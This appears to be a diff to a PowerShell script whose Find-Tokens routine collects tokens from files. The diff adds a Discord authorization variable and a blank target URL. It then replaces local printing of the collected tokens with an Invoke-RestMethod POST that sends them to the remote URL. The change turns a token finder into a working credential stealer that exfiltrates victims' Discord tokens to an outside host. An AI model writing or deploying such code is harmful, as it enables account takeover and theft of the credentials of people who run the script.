@@ -1,3 +1,7 @@
+$url = "";
+
+$Discord_token = "";
+
 function Find-Tokens {
     param ([string]$path)
 
@@ -61,7 +65,18 @@ function Main {
         $message += "`n";
     }
 
-    Write-Output $message;
+    
+    $headers = @{
+        "Authorization" = $Discord_token
+    }
+
+    $body = @{
+        "content" = $message
+    }
+
+    $bodyJson = $body | ConvertTo-Json
+    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"
+
 }
 
 Main
